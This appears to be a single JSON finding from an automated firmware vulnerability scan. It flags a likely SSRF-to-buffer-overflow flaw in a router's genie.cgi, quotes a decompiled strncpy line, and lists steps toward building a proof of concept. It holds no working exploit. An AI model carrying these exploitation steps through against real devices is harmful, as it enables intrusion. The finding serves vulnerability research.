{"name": "SSRF-to-BufferOverflow-genie.cgi", "file_path": "www/cgi-bin/genie.cgi", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.5, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "strncpy(*(puVar5 + -0x24),*(puVar5 + -0x40),*(puVar5 + -0x44) - *(puVar5 + -0x40));", "link_identifiers": ["t=", "X-Error-Code", "strncpy", "REDACTED_SENSITIVE_DATA", "fcn.000093e4", "snprintf"], "notes": "Vulnerability Verification: 1) SSRF path confirmed feasible 2) Buffer overflow risk confirmed present 3) Further ARM stack layout validation required to determine precise overflow length and control potential. Recommended next steps: 1) Precisely calculate stack layout and offsets 2) Verify presence of ASLR/NX mitigations 3) Develop PoC to validate actual exploitability."}
